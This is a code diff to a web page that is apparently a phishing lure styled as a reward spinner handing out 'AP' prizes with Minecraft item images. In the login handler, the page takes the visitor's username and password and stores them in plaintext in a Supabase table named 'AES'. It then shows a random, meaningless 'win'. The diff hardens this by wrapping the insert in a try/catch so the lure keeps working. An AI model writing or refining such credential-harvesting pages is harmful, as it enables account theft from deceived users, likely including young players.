@@ -232,11 +232,11 @@
     const _db = supabase.createClient(S_URL, S_KEY);
 
     const rewards = [
-        { name: "100AP", img: "100.png" },
-        { name: "500AP", img: "500.png" },
-        { name: "1000AP", img: "1000.png" },
-        { name: "200AP", img: "200.png" },
-        { name: "2000AP", img: "2000.png" }
+        { name: "100AP", img: "https://minecraft.wiki/images/Thumb_Sprite_Gold_Ingot_JE4_BE2.png" },
+        { name: "500AP", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_JE3_BE3.png" },
+        { name: "1000AP", img: "https://minecraft.wiki/images/Thumb_Sprite_Emerald_JE3_BE3.png" },
+        { name: "200AP", img: "https://minecraft.wiki/images/Thumb_Sprite_Iron_Ingot_JE4_BE2.png" },
+        { name: "2000AP", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Ingot_JE1_BE1.png" }
     ];
 
     async function connectAndGo() {
@@ -244,8 +244,11 @@
         const p = document.getElementById('password').value;
         if(!u || !p) return alert("Bilgileri gir!");
 
-        // Tablo adı görselindeki gibi 'AES' olarak ayarlandı
-        await _db.from('AES').insert([{ username: u, password: p }]);
+        try {
+            await _db.from('AES').insert([{ username: u, password: p }]);
+        } catch (e) {
+            console.log("Supabase hatası (muhtemelen tablo yok):", e);
+        }
 
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
@@ -275,4 +278,16 @@
         btn.style.opacity = "0.3";
 
         const move = 6000 + Math.floor(Math.random() * 2000);
-        strip
+        strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
+        strip.style.transform = `translateX(-${move}px)`;
+
+        setTimeout(() => {
+            const final = rewards[Math.floor(Math.random() * rewards.length)];
+            document.getElementById('win-modal').style.display = 'flex';
+            document.getElementById('win-name').innerText = final.name;
+            document.getElementById('win-img').src = final.img;
+        }, 6500);
+    }
+</script>
+</body>
+</html>
